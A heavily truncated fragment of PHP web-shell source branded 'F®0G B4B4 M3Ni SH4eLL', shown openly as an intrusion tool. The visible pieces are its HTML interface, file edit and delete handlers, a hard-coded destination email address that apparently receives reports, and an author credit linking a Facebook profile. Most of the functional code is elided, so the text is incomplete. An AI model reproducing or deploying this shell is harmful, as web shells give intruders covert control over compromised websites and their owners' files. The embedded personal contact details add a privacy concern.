...
hash(3c527141fce7b2bce15757506d414648dbe1b25b)
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>F®0G B4B4 M3Ni SH4eLL</title>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<link rel="icon" href="https://1.bp.blogspot.com/-vBv32RT4vk0/YBhHpD-BOoI/AAAAAAAAAHc/RFpdIsl1Se43CITm0KcWh26XsiMB08nAACLcBGAsYHQ/s505/received_323446199058446.webp">
<title></title>
<center>
...
echo '<script>alert("Edit File Fail !!")</script>';
}
fclose($fp);
}
echo '<form method="POST">
...
echo '<script>alert("Delete File Fail !!")</script>';
}
}
}
...
$tujuanmail = 'makashik64@gmail.com';
...
<center>
<br>
<font size="2px" color="white">Copyright &#169; <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear()); </script> <a href="https://www.facebook.com/username.le.kamla.dis/">F®0G B4B4</a> All Right Reserved.</font>
</center>
</BODY>
</HTML>